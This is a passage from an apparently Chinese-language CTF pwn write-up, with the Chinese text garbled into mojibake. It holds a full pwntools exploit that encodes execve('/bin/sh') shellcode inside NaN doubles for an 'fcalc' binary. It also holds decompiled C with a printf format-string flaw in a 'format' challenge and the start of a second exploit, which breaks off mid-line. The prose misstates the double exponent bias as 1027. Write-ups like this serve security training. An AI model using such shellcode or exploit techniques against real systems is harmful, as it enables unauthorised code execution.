ˆä¸Šshellcodeçš„æ‰§è¡Œ</p><p>åŠ¨æ€è°ƒè¯•çš„éƒ¨åˆ†è¾¹çœç•¥ï¼Œä¸»è¦è¿˜æ˜¯å¯¹ä¸Šè¿°çš„éªŒè¯</p><p>IEEEæ ‡å‡†çš„æµ®ç‚¹å½¢å¼çš„doubleå‹ä¸»è¦æ˜¯1ä½çš„ç¬¦å·ä½ï¼Œ11ä½çš„æŒ‡æ•°ä½ï¼Œ52ä½çš„æœ‰æ•ˆæ•°ï¼Œå…¶ä¸­æŒ‡æ•°ä½æ˜¯è¦å†åŠ ä¸Šä¸€ä¸ªåç§»1027å³011111111111ï¼Œä¾‹å¦‚1çš„æµ®ç‚¹å½¢å¼ä¾¿æ˜¯0 0111111111111 000000000â€¦â€¦.00000000</p><p>è€Œæµ®ç‚¹å½¢å¼çš„ç‰¹æ®Šæƒ…å†µä¾¿æ˜¯NaNï¼Œè¡¨ç¤º0&#x2F;0ç­‰æ— æ„ä¹‰çš„å½¢å¼ï¼Œå…¶ä¸­</p><p>NaN çš„ä¸¤ä¸ªç‰¹æ®Šå±æ€§æ˜¯ï¼š</p><ol><li><strong>ä¸å…¶ä»–æµ®ç‚¹æ•°ï¼ˆåŒ…æ‹¬ NaN å’Œ Â±âˆ</strong> ï¼‰çš„æ¯”è¾ƒç»“æœï¼š</li></ol><table><thead><tr><th>æ¯”è¾ƒ</th><th>NaN â‰¥ x</th><th>NaN â‰¤ x</th><th>NaN &gt; x</th><th>NaN &lt; x</th><th>NaN &#x3D; x</th><th>NaN â‰  x</th></tr></thead><tbody><tr><td>ç»“æœ</td><td>False</td><td>False</td><td>False</td><td>False</td><td>False</td><td>True</td></tr></tbody></table><ol><li>å®ƒæœ‰è®¸å¤šå¯èƒ½çš„ç¼–ç ï¼Œå…è®¸å®ƒæºå¸¦å…¶ä»–ä¿¡æ¯ï¼Œä¾‹å¦‚æŒ‡ç¤º NaN æ¥æºçš„è¯Šæ–­ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼š</li></ol><p>double-64 NaNï¼š<code>s111 1111 1111 xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx</code> ï¼ˆå…¶ä¸­<em>s</em>æ˜¯ç¬¦å·ï¼Œ<em>x</em>åºåˆ—è¡¨ç¤ºéé›¶æ•°å­—ï¼ˆé›¶å€¼ç¼–ç è¡¨ç¤ºæ— ç©·å¤§ï¼‰ï¼‰</p><p>å› æ­¤å¦‚æœç›´æ¥ä»¥NaNè¡¨ç¤ºçš„è¯é‚£ä¸ªæ¡ä»¶ä¾¿æ˜¯ä¸æˆç«‹çš„ï¼Œå°±èƒ½ç›´æ¥æ„é€ shellcode</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">pc = <span class="string">&#x27;./fcalc&#x27;</span></span><br><span class="line">aslr = <span class="literal">True</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;deepin-terminal&quot;,&quot;-m&quot;,&quot;splitscreen&quot;,&quot;-e&quot;,&quot;bash&quot;,&quot;-c&quot;]</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(pc,aslr=aslr,env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">    p = process(pc,aslr=aslr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    remote_addr = [<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">6666</span>]</span><br><span class="line">    p = remote(remote_addr[<span class="number">0</span>], remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line">sn  = <span class="keyword">lambda</span> x   : p.send(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>     : p.recvline()</span><br><span class="line">sl  = <span class="keyword">lambda</span> x   : p.sendline(x)</span><br><span class="line">rv  = <span class="keyword">lambda</span> x   : p.recv(x)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;1 1 0&#x27;</span>.ljust(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload += p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)*<span class="number">2</span> <span class="comment"># frist two doubles in the stack (padding)</span></span><br><span class="line"></span><br><span class="line">    jmpn = <span class="string">b&quot;\xEB\x02&quot;</span></span><br><span class="line">    NaNHeader = <span class="string">b&quot;\xFF\x7F&quot;</span></span><br><span class="line">    <span class="comment"># 0:  31 c0                   xor    eax,eax</span></span><br><span class="line">    <span class="comment"># 2:  31 db                   xor    ebx,ebx</span></span><br><span class="line">    <span class="comment"># 4:  66 b8 3b 00             mov    ax,0x3b</span></span><br><span class="line">    <span class="comment"># 8:  66 bb 68 00             mov    bx,0x68</span></span><br><span class="line">    <span class="comment"># c:  48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line">    <span class="comment"># 10: 66 bb 2f 73             mov    bx,0x732f</span></span><br><span class="line">    <span class="comment"># 14: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line">    <span class="comment"># 18: 66 bb 69 6e             mov    bx,0x6e69</span></span><br><span class="line">    <span class="comment"># 1c: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line">    <span class="comment"># 20: 66 bb 2f 62             mov    bx,0x622f</span></span><br><span class="line">    <span class="comment"># 24: 53                      push   rbx</span></span><br><span class="line">    <span class="comment"># 25: 48 89 e7                mov    rdi,rsp</span></span><br><span class="line">    <span class="comment"># 28: 31 f6                   xor    esi,esi</span></span><br><span class="line">    <span class="comment"># 2a: 31 d2                   xor    edx,edx</span></span><br><span class="line">    <span class="comment"># 2c: 0f 05                   syscall</span></span><br><span class="line">    payload += <span class="string">&#x27;\x31\xc0\x31\xdb&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xb8\x3b\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xbb\x68\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xbb\x2f\x73&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xbb\x69\x6e&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xbb\x2f\x62&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x53\x48\x89\xe7&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x31\xf6\x31\xd2&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x0f\x05\x90\x90&#x27;</span> + jmpn + NaNHeader    <span class="comment"># \x90 is nop</span></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;expression:\n&#x27;</span>)</span><br><span class="line">    sn(payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405031925684.png" alt="image-20240502202506903" style="zoom:50%;" /><h1 id="format"><a href="#format" class="headerlink" title="format"></a>format</h1><h2 id="é™æ€åˆ†æ-1"><a href="#é™æ€åˆ†æ-1" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+15h] [rbp-14Bh]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [rsp+16h] [rbp-14Ah]</span></span><br><span class="line">  <span class="type">char</span> *lineptr; <span class="comment">// [rsp+18h] [rbp-148h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+20h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+28h] [rbp-138h] BYREF</span></span><br><span class="line">  __int64 temp_size; <span class="comment">// [rsp+30h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *ptr1; <span class="comment">// [rsp+38h] [rbp-128h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">264</span>]; <span class="comment">// [rsp+40h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+148h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):&quot;</span>);</span><br><span class="line">    lineptr = <span class="number">0LL</span>;</span><br><span class="line">    n = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( getline(&amp;lineptr, &amp;n, <span class="built_in">stdin</span>) &lt;= <span class="number">0</span> )    <span class="comment">// è¯»å–åˆ°linepträ¸€è¡Œå­—ç¬¦</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = lineptr;</span><br><span class="line">    v3[<span class="built_in">strcspn</span>(lineptr, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*lineptr )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    temp_size = hexs2bin(lineptr, &amp;ptr);</span><br><span class="line">    ptr1 = ptr;</span><br><span class="line">    <span class="keyword">if</span> ( !temp_size )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error: failed to decode hex&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n=~= miss-analyzer =~=&quot;</span>);</span><br><span class="line">    v5 = read_byte(&amp;ptr1, &amp;temp_size);          <span class="comment">// è¯»ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;nothing now.&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;nothing now.&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;nothing now.&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    consume_bytes(&amp;ptr1, &amp;temp_size, <span class="number">4LL</span>);      <span class="comment">// è¯»4ä¸ªå­—èŠ‚</span></span><br><span class="line">    read_string(&amp;ptr1, &amp;temp_size, format, <span class="number">255LL</span>);<span class="comment">// è¯»å…¥format</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hash: %s\n&quot;</span>, format);</span><br><span class="line">    read_string(&amp;ptr1, &amp;temp_size, format, <span class="number">255LL</span>);<span class="comment">// å†æ¬¡è¯»å…¥format</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Player name: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(format);                             <span class="comment">// æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    read_string(&amp;ptr1, &amp;temp_size, format, <span class="number">255LL</span>);<span class="comment">// å†æ¬¡è¯»å…¥format</span></span><br><span class="line">    consume_bytes(&amp;ptr1, &amp;temp_size, <span class="number">10LL</span>);     <span class="comment">// è¯»10ä¸ªå­—èŠ‚</span></span><br><span class="line">    v6 = read_short(&amp;ptr1, &amp;temp_size);         <span class="comment">// è¯»2ä¸ªå­—èŠ‚</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Miss count: %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Yep, looks like you missed.&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You didn&#x27;t miss!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=~=~=~=~=~=~=~=~=~=~=\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(lineptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr);     </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜çš„é™æ€åˆ†æååˆ†å›°éš¾ï¼Œè€Œä¸”è„šæœ¬çš„ç¼–å†™ä¹Ÿå¾ˆå›°éš¾ï¼Œç®—æ˜¯é•¿è§è¯†äº†ã€‚ã€‚ï¼ˆç¬¬ä¸€æ¬¡è„šæœ¬æ²¡å†™å‡ºæ¥</p><p>å…ˆçœ‹read_stringå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">read_string</span><span class="params">(_QWORD *a1, _QWORD *a2, _BYTE *a3, <span class="type">unsigned</span> <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> byte; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  *a3 = <span class="number">0</span>;</span><br><span class="line">  result = (_BYTE *)read_byte(a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result != <span class="number">0xB</span> )                 <span class="comment">// ç¬¬ä¸€ä¸ªå­—èŠ‚è¦æ˜¯0b</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error: failed to read string&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i += <span class="number">7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      byte = read_byte(a1, a2);</span><br><span class="line">      v10 |= (byte &amp; <span class="number">0x7F</span>) &lt;&lt; i;</span><br><span class="line">      <span class="keyword">if</span> ( byte &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = a4;</span><br><span class="line">      <span class="keyword">if</span> ( a4 &gt; v10 )</span><br><span class="line">        v6 = v10;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &lt;= j )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      a3[j] = read_byte(a1, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v10 &gt; j )</span><br><span class="line">    &#123;</span><br><span class="line">      read_byte(a1, a2);</span><br><span class="line">      ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = v10;</span><br><span class="line">    <span class="keyword">if</span> ( a4 &lt;= v10 )</span><br><span class="line">      v7 = a4;</span><br><span class="line">    result = &amp;a3[v7];</span><br><span class="line">    *result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†çœ‹read_byteå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_byte</span><span class="params">(_QWORD *ptr1, _QWORD *ptr2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [rsp+1Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !*ptr2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error: failed to read replay&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = *(_BYTE *)(*ptr1)++;</span><br><span class="line">  --*ptr2;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤æ‚çš„ä¸€åŒ¹ï¼Œä½†æ˜¯ææ‡‚æ¯ä¸ªå‡½æ•°çš„å†…å®¹ï¼Œç„¶åå†ä¸€æ­¥ä¸€æ­¥æ¥ï¼Œä¾¿ä¸ä¼šæœ‰å¤ªå¤§çš„å›°éš¾</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./format&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">content=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(local):</span><br><span class="line">        <span class="keyword">if</span> content:</span><br><span class="line">            gdb.attach(p,content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">            pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span>(local):</span><br><span class="line">        <span class="keyword">return</span> process(elf_path)</span><br><span class="line">    <span class="keyword">return</span> remote()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consume_bytes</span>(<span class="params">nb:<span class="built_in">int</span></span>)-&gt;<span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;55&#x27;</span>*nb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_string</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    size = (<span class="built_in">hex</span>(<span class="built_in">len</span>(s))[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&quot;0&quot;</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = binascii.hexlify(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    info(<span class="string">f&quot;<span class="subst">&#123;size&#125;</span> + <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;0b&quot;</span> 